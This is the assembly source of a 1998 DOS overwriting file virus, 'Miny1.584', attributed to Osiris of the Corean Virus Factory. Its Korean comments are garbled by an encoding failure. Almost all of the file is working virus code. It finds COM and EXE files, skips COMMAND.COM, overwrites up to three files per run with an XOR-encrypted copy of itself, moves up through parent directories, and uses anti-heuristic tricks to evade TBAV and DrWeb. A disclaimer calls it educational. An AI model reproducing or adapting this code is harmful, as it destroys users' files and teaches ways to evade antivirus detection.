;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;                                              \\\\\\\  \       \  \
;     Miny1.584                               \          \     \   \
;                 by Osiris / CVC             \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #01
;
;
; Name : Miny1.584
; AV Name : Miny, MinyO, KOV.Mini1
; Original Author : KOV of SVS
; Author : Osiris of CVC
; Origin : Corea
; Date : 1998/01/02
; Type : Non Resident  Overwriting
;
; !****************************************************************************!
; *                                                                            *
; * �w�� !                                                                     *
; *    �����e �a����a ���a š�a���a. �a�B�ⷥ ����a���e �a�w�A�ᴡ�e�a.      *
; *    �A�b�a�e �� ���aš�a�� �����A�e ����e ���A�A ��Ё�ᕡ �����i ���� �g   *
; *    �e�a. �e�w �a��a ��З�a�� �i�a !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify & execute it !                                        *
; *                                                                            *
; !****************************************************************************!
;
; Miny1.399 �a����a�� �����e���a.
; Anti-Heuristic �i �a�wЁ�� �������w �񬂵A�ᕡ ���e�A�� �g�e�a.
; �a���e, �eѢ EXE �a���i �q�q���v�i �w�� �¸w�a�� �a�� �����a �i�a�� �����a��a
; �� ���e�A���� �e�a. ���� �s�a�a���w �a����a ���a�� ��� ���a ���a.
;
; AV Test : ���e �e�Q
; Heuristic Test : ���e �e�Q
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>


 Miny1         SEGMENT PARA 'Miny1'
               assume cs:Miny1, ds:Miny1

               Org    100h

 Entry:        call   Anti_TBAV                 ; TBAV ���e �wЁ & �qѡ Ή��

 Encry_Start:
               mov    byte ptr S_Find,0FFh      ; COM �q�q���a, EXE �q�q���a
               mov    byte ptr Total,00         ; 3�� �q�q
               mov    byte ptr Infected,00      ; �q�q�E �����i 0 �a�� �e�a.
               Jmp    Virus_Start               ; �a�� �x���� ���a

;
; �A���� �t �w�b
;

 Vir_Msg       db ' [Miny1]  from Corean Virus Factory !',0Dh,0Ah
               db ' Anti-Heuristic Version / FREEWARE  98/01/02',0Dh,0Ah
               db ' (c) Copyleft 1991-95 by KOV of SVS,Corea',0Dh,0Ah
               db ' (c) Copyleft 1997-98 by Osiris of CVC,Corea',0Dh,0Ah
               db ' Thanx to MOV of SVS !$'

 Msg           DB     'Abnormal Program Termination.',0Dh,0Ah,'$'

 Total         DB     ?                         ; �q�q��ǥ��
 Infected      DB     ?                         ; ���q�a�� �q�q�E �a���i
 S_Find        DB     ?                         ; �q�q��ǡ�� ���e �wȁ
 UP            DB     '..',00                   ; �w�ᝡ ����

 Virus_Start:
               xor    ax,ax
               mov    ds,ax
               mov    bx,0090h
               push   DS:[BX]                   ; Int 24h �t ��w
               Push   DS:[BX+2]

               mov    DS:[BX],offset NewInt24
               mov    DS:[BX+2h],cs             ; Int 24h �a����

               Push   CS                        ; cs=ds
               Pop    DS

               mov    word ptr Target_File, '.*'; *. ��w
                                                ; �a�� �t���a �a�� �x��
                                                ; Anti-Heuristic for DrWeb
 Find_File:
               Mov    ah, (4Eh xor 12h)
               Mov    cx,00100011B              ; �a�� ����
               mov    dx, offset Target_File
 Find:         xor    ah,12h
               Int    21h                       ; �� �a�� �x���e ��́�a�E�a.
               Jnc    ChkInfect                 ; �A��?
               jmp    Check_S_Find
 ChkInfect:
               mov    ax, DS:[0080h+1Eh]
               cmp    ax,'OC'                   ; COMMAND.COM ���a ?
               jnz    InfectFile                ; �q�q �A�A

 Find_NEXT:
               Mov    ah, (4Fh xor 12h)         ; �a�q �a�� ��a
               JMP    Find                      ;

 InfectFile:
               mov    ax,0143h                  ; �����i ����/�a���� �e�e�a.
               xor    cx,cx                     ; DTA �a 0080h ���� ���b�a�a��
               mov    dx,0080h
               add    dl,1Eh                    ; DX=009Eh
               xchg   ah,al
               int    21h
               jc     Stop_Virus

               mov    ax,023Dh                  ; ���e/�a���� ���e
               xchg   ah,al                     ; AX=3D02h
               int    21h
               jc     Stop_Virus

               xchg   ax,bx                     ; AX �A Ѕ�i ����
               mov    ax,(5700h xor 5700h)      ; ���e �苡
               xor    ax,5700h
               int    21h
               push   cx
               push   dx

               mov    ah,3Fh                    ; �|���� ���� �i����
               mov    cx,0001
               mov    dx, offset Buffer
               int    21h

               mov    ax,4200h
               xor    cx,cx
               xor    dx,dx
               int    21h

               cmp    byte ptr Buffer, 0E8h     ; �q�q�A���a ?
               jnz    Get_Key_Value
               inc    byte ptr INFECTED         ; �q�q�E �a�� ����
               jmp    Restore_File_DT

 Get_Key_Value:
               xor    ax,ax                     ; ������ ���e �苡 (�qѡ��
               mov    es,ax                     ; �A �a�w)
               mov    al,byte ptr ES:[046Ch]    ; 0000:046Ch
               Push   CS                        ; cs=es
               Pop    ES                        ;
               mov    Key_Value,al              ; Key_Value = �qѡǡ �t
               call   Write_Vir                 ; �a����a �a�� ѡ
               Inc    byte ptr Total            ; 1 �w�a

 Restore_File_DT:
               pop    dx                        ; ���e ����
               pop    cx
               mov    ax,0157h                  ; ���e ����(���� ���e)
               xchg   ah,al                     ; AX=5701h
               int    21h

               mov    ah,3eh                    ; �a�� �h��
               Int    21h

               cmp    byte ptr Total,3          ; 3�� �q�q���v�a?
               jz     Stop_Virus
               JMP    Find_NEXT

 Stop_Virus:
               xor    ax,ax                     ; ���� Int 24h �� �a��
               mov    ds,ax
               mov    bx,0090h
               pop    DS:[BX+2]
               pop    DS:[BX]
               Push   CS
               Pop    DS
               mov    dx, offset Msg            ; ���w�ⷥ �A�ᝡ �a�w
               cmp    byte ptr Infected,15      ; 15�����w �q�q�E �a���� ���a�e
               jb     PrtMsg                    ; �A���� �b

               mov    dx, offset Vir_Msg
 PrtMsg:       mov    ah,9                      ; �A���� �b
               Int    21h

               Mov    ax,4CFFh                  ; �a����a ���a
               int    21h


 Check_S_Find:
               cmp    byte ptr S_Find, 0FFh     ; �a�� �a�����a �x�v�e�a ?
               jnz    Check_Find_com
 Find_Com:
               mov    byte ptr S_Find, 0        ; COM �a�� ���� �q�q
               mov    word ptr Target_File+2,'oc'
               mov    byte ptr Target_File+4,'m'
               mov    byte ptr Target_File+5, 0 ; *.com
               jmp    Find_File

 Check_Find_com:
               cmp    byte ptr S_Find,1         ; 01���e EXE �a���� �q�q���v�a.
               Jnz    DX_EXE
               mov    dx, offset UP             ; �w�� ���Bɡ���� ����
               mov    ah, 3Bh
               Int    21h
               jc     Stop_Virus                ; ���a ���Bɡ�� ���a ?
               jmp    Find_Com
 DX_EXE:
               Mov    byte ptr S_Find,1         ; EXE �a���i �q�q���a�a.
               mov    word ptr Target_File+2,'xe';
               mov    byte ptr Target_File+4,'e'
               mov    byte ptr Target_File+5, 0 ; *.exe
               Jmp    Find_File

 NewInt24:                                      ; Int 24h �១
               xor    al,al
               IRET

 End_Encry:

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;             �a����a �qѡ�� ����
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 Write_Vir:    call   Decode                    ; �qѡ��
               mov    ah, 3Fh                   ; �a����a �a��
               inc    ah                        ; AH=40h
               mov    dx, 100h                  ;
               mov    cx, offset Vir_END - 100h ;
               Int    21h
               call   Decode                    ; �qѡ Ё�A
               RET
 Key_Value     DB     ?

 Anti_TBAV:
               cmp    al,100                    ; Thanx ! MOV !
               je     Decode                    ; TBAV �� '#' �i���a�a �i���a��
               inc    al                        ; �g�e�a.
               loop   Anti_TBAV                 ;
 Decode:
               mov    di, offset Encry_Start    ; �qѡ ���b��
               mov    ah, Key_value
               mov    si,di
               mov    cx, offset End_Encry - Encry_Start
 E_Ing:
               lodsb                            ; �qѡ��
               xor    al,ah
               stosb
               loop   E_ing
               RET
 Vir_END:

 Target_File   db     0,0,0,0,0,0               ; �q�q�i ��ǩ �a�� �¸w�a
 Buffer        db     ?

 Miny1         ENDS
               END    Entry
